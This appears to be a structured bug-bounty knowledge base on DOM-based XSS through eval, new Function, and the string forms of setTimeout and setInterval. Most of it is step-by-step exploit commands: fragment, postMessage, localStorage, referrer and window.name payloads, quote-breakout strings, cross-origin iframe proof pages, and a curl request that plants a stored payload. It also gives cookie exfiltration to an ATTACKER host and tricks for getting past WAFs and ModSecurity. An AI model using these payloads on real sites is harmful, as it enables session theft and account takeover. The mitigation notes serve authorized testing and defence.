sinks.name: eval
sinks.severity_note: P2 when attacker-controlled input reaches it with no filtering; P3 when the source requires an unusual gadget or strong filtering is partially present.
sinks.explain: eval() parses and executes a string as JavaScript code in the current scope. Any string that reaches it is compiled at runtime with full access to the surrounding lexical environment, the DOM, cookies (non-HttpOnly), and the origin's authority for same-origin requests.
sinks.how_it_works: When a value derived from an attacker-controllable source (fragment, postMessage, storage, network response) is concatenated into the string passed to eval(), the attacker's characters become live code. Because the payload rides inside a data value rather than HTML, HTML-level sanitizers do not help; only the JS data flow matters. Indirect eval (0,eval)(s) or window['eval'](s) executes in global scope and is equally dangerous.
sinks.why_it_matters: A single eval() reached by a DOM source is full DOM-XSS: session token theft, account actions via authenticated fetch(), keylogging, and UI redress. Because eval executes in page scope it can also read closure variables that a plain injected <script> tag could not reach, sometimes exposing internal tokens or CSRF nonces held in JS memory.

steps.action: Confirm the fragment reaches eval()
steps.command: open 'https://TARGET/page#jlf-trace-1337' in a browser and inspect the eval call in DevTools (set a breakpoint on the eval line or wrap eval: window._e=eval; eval=function(s){console.log(s);return window._e(s)})
steps.indicator: the string 'jlf-trace-1337' appears in the logged argument passed to eval()

steps.action: Fire a proof payload that survives the surrounding syntax
steps.command: open 'https://TARGET/page#alert(document.domain)' in a browser
steps.indicator: an alert dialog showing the target origin's domain appears

steps.action: If the code wraps the fragment in quotes or an expression, close the context
steps.command: open "https://TARGET/page#'+alert(document.domain)+'" in a browser
steps.indicator: the alert fires; without the quote-break you would see a SyntaxError in the console instead

steps.action: Demonstrate impact with session-token exfiltration
steps.command: open "https://TARGET/page#'+fetch('https://ATTACKER/c?c='+document.cookie)+'" in a browser while logged in as a test account
steps.indicator: your listener at ATTACKER receives a request containing the test session cookie

chains.eligibility: Classic DOM XSS via fragment; accepted on all major platforms (HackerOne, Bugcrowd, Intigriti). The fragment never reaches the server, so a server-side WAF cannot see it — no WAF-evasion credit, but also no false 'WAF blocked it' dismissal.

steps.action: Confirm the message handler forwards data into eval() and check the origin validation
steps.command: in DevTools console on https://TARGET/page run: window.addEventListener('message',e=>console.log(e.origin,e.data)); then postMessage('jlf-trace-1337','*') from any iframe or console
steps.indicator: the posted value is logged and a breakpoint on the eval line shows it inside the evaluated string

steps.action: Exploit missing or weak origin check with a cross-origin frame
steps.command: host 'https://ATTACKER/poc.html' containing <iframe src="https://TARGET/page"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)','*')</script> and open it
steps.indicator: the alert fires inside the target frame, proving cross-origin code execution

steps.action: If the handler expects JSON, fit the payload into the parsed field
steps.command: frames[0].postMessage('{"cmd":"eval","arg":"alert(document.domain)"}','*')
steps.indicator: the alert fires, showing the JSON field is concatenated into eval() unsanitized

chains.eligibility: postMessage-to-eval is a top-tier finding; accepted everywhere when the origin check is absent, '*', or bypassable (e.g. regex /target.com$/ matching attacker.target.com.evil.test). Always record the exact origin-validation code in the report.

steps.action: Plant a marker and confirm the flow
steps.command: in DevTools console on https://TARGET run: localStorage.setItem('config','jlf-trace-1337'); then reload the page that evals the stored value
steps.indicator: a breakpoint on the eval line shows 'jlf-trace-1337' inside the evaluated string after reload

steps.action: Fire the stored payload
steps.command: localStorage.setItem('config','alert(document.domain)'); location.reload()
steps.indicator: the alert fires on every page load that reads the key, proving persistent XSS

steps.action: Chain from a lower-severity storage write primitive if you cannot set the key directly
steps.command: identify any feature that writes attacker text into the same key (profile field, import function, sync endpoint) and submit alert(document.domain) through it
steps.indicator: after the victim's client syncs, the eval fires in their session — this turns a self-XSS into a stored XSS

chains.eligibility: Self-planted localStorage-to-eval is self-XSS and usually NOT eligible on its own. It becomes a valid finding when a separate, remotely triggerable write path (stored XSS, backend field, sync API) populates the key — document both halves of the chain.

steps.action: Map the XHR/fetch endpoint whose response body is eval'd
steps.command: curl -s 'https://TARGET/api/config' -H 'Cookie: session=SESSION_ID' and diff the response against what a breakpoint on eval() receives
steps.indicator: a response field you can influence (via profile, upload, or another stored vector) appears verbatim in the eval argument

steps.action: Store the payload through the influencing endpoint
steps.command: curl -s -X POST 'https://TARGET/api/profile' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{"bio":"alert(document.domain)"}'
steps.indicator: the stored value is later returned by the eval'd endpoint

steps.action: Trigger execution in the browser
steps.command: open 'https://TARGET/dashboard' as a test account whose data contains the payload
steps.indicator: the alert fires when the page evals the API response, proving stored DOM XSS

chains.eligibility: Accepted as stored XSS when a second user (or the victim account) is affected. If the response field only ever contains your own data and only you view it, platforms grade it self-XSS — show cross-account impact or a victim-view page to qualify.

contexts.js-expression: Most common: the source is concatenated into a code string, e.g. eval('run("'+location.hash.slice(1)+'")'). Break out with '");alert(document.domain);//' or the quote-appropriate variant.
contexts.json-field: The eval'd string is built by JSON.parse then template-concatenated; payload must survive JSON encoding, so avoid raw double quotes or escape them as \" inside the stored value.
contexts.url-context: If the source arrives URL-encoded and the code does not decode it, submit %27%29%3Balert(document.domain)%2F%2F or a double-encoded %2527 variant depending on how many decode passes occur.

sinks.waf_notes: Fragment-based chains are invisible to server-side WAFs (the hash is never sent). For search/referrer/response chains, common blocks are the words 'eval', 'alert', and '<script': use top['al'+'ert'](document.domain), String.fromCharCode-built code, or window['\x65val']. ModSecurity CRS often flags document.cookie — exfiltrate via localStorage or navigator.sendBeacon with an innocuous parameter name.
sinks.eligibility: DOM XSS into eval() is accepted on all major platforms and is typically graded Medium-High. Findings where the victim must paste code into their own DevTools console are self-XSS and are almost always NOT eligible; never report a console-paste PoC as the primary vector. Indirect eval, new Function-style aliases, and obfuscated calls (window['e'+'val']) are in scope — report them under this sink.
mitigations: Remove eval() entirely; replace string-to-code logic with a dispatch table or JSON-driven configuration.
Enforce a strict Content-Security-Policy without 'unsafe-eval' so eval() throws even if reached.
Validate postMessage origin with an exact allowlist (e.origin === 'https://trusted.example') before touching e.data.
Never concatenate storage, URL, or network data into code strings; parse data with JSON.parse and act on whitelisted keys only.
references: OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)

sinks.name: Function constructor
sinks.severity_note: Same class as eval(); P2 with a direct DOM source, P3 when a gadget or unusual calling convention is required.
sinks.explain: The Function constructor compiles its string arguments into a new function whose body is attacker-controlled code. new Function('a','b', body) creates a function that executes body when called; Function(body)() compiles and immediately invokes.
sinks.how_it_works: Unlike direct eval(), functions created this way execute in global scope, not the caller's scope — so closure variables are out of reach, but the DOM, cookies, and same-origin fetch() are fully available. Developers reach for it to build dynamic templates, expression evaluators, and polyfills, which is exactly where tainted strings slip in.
sinks.why_it_matters: It is the lesser-known sibling of eval(): code reviewers and linters that flag eval() often miss new Function(), and CSP 'unsafe-eval' blocks both equally — so a finding here often survives in codebases that already cleaned up their eval() calls.

steps.action: Confirm the fragment reaches the Function body
steps.command: open 'https://TARGET/page#jlf-trace-1337' with a breakpoint on the 'new Function' line and inspect the final argument
steps.indicator: the traced value appears inside the body string passed to the Function constructor

steps.action: Fire the proof payload
steps.command: open 'https://TARGET/page#alert(document.domain)' in a browser
steps.indicator: the alert fires when the constructed function is invoked

steps.action: Break out if the fragment is embedded in a return statement
steps.command: open 'https://TARGET/page#;alert(document.domain);//' in a browser
steps.indicator: the alert fires; the trailing // neutralizes the remainder of the generated body

chains.eligibility: Accepted as DOM XSS on all major platforms; fragment delivery makes it server-WAF-blind.

steps.action: Verify the message data is used as a Function body and audit the origin check
steps.command: postMessage('jlf-trace-1337','*') from DevTools console on https://TARGET/page while a breakpoint sits on the 'new Function' line
steps.indicator: the posted value appears in the constructor's body argument

steps.action: Deliver code execution cross-origin
steps.command: open a page hosting <iframe src="https://TARGET/page"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)','*')</script>
steps.indicator: the alert fires inside the target frame

chains.eligibility: Accepted everywhere when the origin check is missing or bypassable; include the exact listener code in the report.

steps.action: Confirm referrer data reaches the constructor
steps.payload: go (save as jlf-trace-1337.html — the tracer travels in the URL itself)
steps.command: host the payload at 'https://ATTACKER/jlf-trace-1337.html', click through to https://TARGET/page, and inspect the breakpoint on 'new Function'
steps.indicator: the referrer string appears inside the generated function body

steps.action: Fire the payload via a crafted referring URL path
steps.command: host 'https://ATTACKER/x.html' with go and navigate with the payload embedded per the app's referrer parsing (e.g. ?utm=alert(document.domain) if a query field is used)
steps.indicator: the alert fires after following the link

chains.eligibility: Referrer-based DOM XSS requires a click from an attacker page and a Referer header that is not stripped; note browser Referrer-Policy defaults (strict-origin-when-cross-origin) in the report — query/path data still survives cross-origin, the full path does not.

contexts.body-argument: Payload lands in the last argument: new Function('x', tainted). Break syntax with ';alert(document.domain);//'.
contexts.argument-list: Payload lands in a parameter-name position: new Function(tainted, 'return 1'). Parameter names are validated loosely; use 'a){alert(document.domain)}function b(' to reshape the signature.
contexts.immediately-invoked: Pattern Function(tainted)() executes on definition — no separate call site needed, so the payload fires the moment the string is built.

sinks.waf_notes: Keyword filters for 'eval' never match. Filters for 'Function' collide with legitimate code and are rare. CSP is the real control: any policy with 'unsafe-eval' absent makes the constructor throw a EvalError — always check the CSP before reporting exploitability at scale.
sinks.eligibility: Accepted as DOM XSS on all major platforms at the same grade as eval(). Self-invocation requiring the victim to paste into console is self-XSS and not eligible. Flag the CSP state: exploitable-but-CSP-blocked findings are often graded lower or as informative.
mitigations: Replace dynamic code generation with a safe expression parser or a static dispatch map.
Deploy CSP without 'unsafe-eval'; Function() then fails closed.
Treat every string argument to Function() as code: never interpolate URL, message, or network data into it.

sinks.name: setTimeout (string argument)
sinks.severity_note: P3: only the string-first-argument form evaluates code; the common function-reference form is safe and must not be reported.
sinks.explain: setTimeout(handler, delay) schedules code. When handler is a string, the browser passes it to the same engine as eval() and executes it in global scope after the delay. When handler is a function, no string evaluation occurs at all.
sinks.how_it_works: Legacy code and quick prototypes pass strings like setTimeout('tick('+id+')', 1000). If any part of that string is attacker-controlled, the injected characters run as code in global scope. The evaluation happens at timer-fire time, which matters for timing and for CSP: string handlers are blocked when 'unsafe-eval' is absent.
sinks.why_it_matters: Reviewers frequently dismiss setTimeout as safe because the function form dominates modern code. Finding the string form — especially in old admin panels, timer utilities, and generated code — yields full DOM XSS with the same impact as eval().

steps.action: Confirm the string-handler form and trace the fragment
steps.command: open 'https://TARGET/page#jlf-trace-1337' and breakpoint the setTimeout line; confirm the first argument is a string containing the traced value
steps.indicator: the first argument is a string (typeof 'string') and contains 'jlf-trace-1337'

steps.action: Fire the payload when the timer fires
steps.command: open 'https://TARGET/page#alert(document.domain)' and wait for the configured delay
steps.indicator: the alert fires after the delay, not immediately — confirming timer-based execution

steps.action: Break the enclosing string if the fragment is quoted inside the handler
steps.command: open "https://TARGET/page#');alert(document.domain);//" in a browser
steps.indicator: the alert fires; without the breakout the console shows a SyntaxError when the timer fires

chains.eligibility: Accepted as DOM XSS; explicitly state in the report that the vulnerable call uses the string form, since triagers may assume the safe function form.

steps.action: Trace a query parameter into the string handler
steps.command: open 'https://TARGET/page?t=jlf-trace-1337' with a breakpoint on setTimeout
steps.indicator: the traced value is inside the string first argument

steps.action: Execute code through the query string
steps.command: open 'https://TARGET/page?t=alert(document.domain)' in a browser
steps.indicator: the alert fires after the delay

steps.action: If the server reflects the parameter through a filter, use an eval-safe alphabet
steps.command: open "https://TARGET/page?t=top['al'%2B'ert'](document.domain)" in a browser
steps.indicator: the alert fires despite a naive 'alert' keyword block

chains.eligibility: Query-string delivery crosses the server, so note any server-side filtering or WAF in the report; still accepted on all major platforms when execution is demonstrated.

steps.action: Plant and trace a stored value
steps.command: localStorage.setItem('task','jlf-trace-1337'); reload https://TARGET/page and inspect the setTimeout string
steps.indicator: the stored value appears inside the string handler after reload

steps.action: Fire the stored payload
steps.command: localStorage.setItem('task','alert(document.domain)'); location.reload()
steps.indicator: the alert fires on each load that schedules the timer

steps.action: Escalate self-XSS to stored XSS via a remote write path
steps.command: find the feature that writes this key (settings sync, import) and submit alert(document.domain) through it as a second account
steps.indicator: the timer payload executes in the first account's browser after sync

chains.eligibility: Self-planted storage is self-XSS (not eligible alone); eligible when a cross-account or server-driven write path populates the key.

contexts.function-handler: Safe: setTimeout(function(){ ... }, 500) or setTimeout(cb, 500). No string is evaluated; do not report.
contexts.extra-arguments: setTimeout(cb, 500, tainted) passes tainted as an argument to cb — safe unless cb itself evals its argument.

sinks.waf_notes: Server-side WAFs see only the URL; payloads in the fragment bypass them entirely. Client-side CSP without 'unsafe-eval' converts the string handler into a silent CSP violation — check the console for 'Refused to evaluate a string as JavaScript' before concluding non-exploitability.
sinks.eligibility: Accepted as DOM XSS when the string form is proven with a live execution PoC. Reports that flag every setTimeout call without distinguishing string vs function form are rejected as false positives — quote the exact call in the report.
mitigations: Always pass a function reference or arrow function to setTimeout, never a string.
Pass dynamic values via the variadic argument list: setTimeout(cb, delay, value).
Enforce CSP without 'unsafe-eval' so string handlers fail closed.
references: OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)

sinks.name: setInterval (string argument)
sinks.severity_note: P3: string-first-argument form only; the function form is safe. Repeated firing makes stored payloads execute in a loop, which can strengthen impact demos.
sinks.explain: setInterval(handler, delay) repeats code on a timer. With a string handler the browser evaluates it as JavaScript in global scope on every tick; with a function handler nothing is evaluated.
sinks.how_it_works: Code such as setInterval('refresh("'+location.hash.slice(1)+'")', 5000) re-compiles the string every interval. An attacker controlling any interpolated value gets recurring code execution — each tick re-runs the payload, which is useful for persistent exfiltration demos but otherwise equivalent to the setTimeout string form.
sinks.why_it_matters: Same risk class as eval() with an added twist: because the string is re-evaluated every tick, a payload stored in a mutable location (localStorage, a global variable, the hash) can be swapped between executions, and a one-time CSP console warning does not stop subsequent ticks once 'unsafe-eval' is present.

steps.action: Confirm the string-handler form and trace the fragment
steps.command: open 'https://TARGET/page#jlf-trace-1337', breakpoint the setInterval line, and verify the first argument is a string containing the traced value
steps.indicator: typeof the first argument is 'string' and it contains 'jlf-trace-1337'

steps.action: Fire the payload on tick
steps.command: open 'https://TARGET/page#alert(document.domain)' and wait one interval
steps.indicator: the alert fires repeatedly on every tick (close it to observe the next one)

steps.action: Demonstrate payload swapping between ticks
steps.command: after the first alert, run location.hash='fetch(\'https://ATTACKER/c?c=\'+document.cookie)' in the console and wait for the next tick
steps.indicator: the second tick executes the new code and your listener receives the cookie — proving live re-evaluation

chains.eligibility: Accepted as DOM XSS; the recurring execution is an impact enhancer, not a separate bug class.

steps.action: Verify message data reaches the interval string
steps.command: postMessage('jlf-trace-1337','*') from the console on https://TARGET/page with a breakpoint on setInterval
steps.indicator: the posted value is inside the string first argument

steps.action: Execute cross-origin on every tick
steps.command: open a page hosting <iframe src="https://TARGET/page"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)','*')</script>
steps.indicator: the alert fires repeatedly inside the target frame

chains.eligibility: Accepted everywhere with a missing/bypassable origin check; document the listener and the absence of origin validation.

steps.action: Plant the payload via window.name from an attacker page
steps.command: host 'https://ATTACKER/poc.html' with <script>window.name='jlf-trace-1337';location='https://TARGET/page'</script> and open it
steps.indicator: after the redirect, a breakpoint on setInterval shows the traced value inside the string handler

steps.action: Execute code through window.name
steps.command: host 'https://ATTACKER/poc2.html' with <script>window.name='alert(document.domain)';location='https://TARGET/page'</script> and open it
steps.indicator: the alert fires on the first tick after navigation

chains.eligibility: window.name persists across cross-origin navigation in the same tab, making it a reliable delivery source; accepted on major platforms with a working PoC page.

contexts.function-handler: Safe: setInterval(() => poll(name), 1000). No evaluation occurs.
contexts.dynamic-delay: Taint in the delay argument (setInterval(cb, tainted)) is a number-coercion issue at worst — not code execution; do not report as this sink.

sinks.waf_notes: Same as the setTimeout string form: fragment and window.name delivery bypass server WAFs; CSP without 'unsafe-eval' blocks every tick with a console violation. Keyword filters for 'alert' are bypassed with top['al'+'ert'](document.domain).
sinks.eligibility: Accepted as DOM XSS with a live string-form PoC. Do not report the function form. Console-paste self-XSS variants are not eligible.
mitigations: Pass function references to setInterval; never strings.
Move dynamic data through closure variables instead of string interpolation.
Enforce CSP without 'unsafe-eval' so string handlers throw.
references: OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)
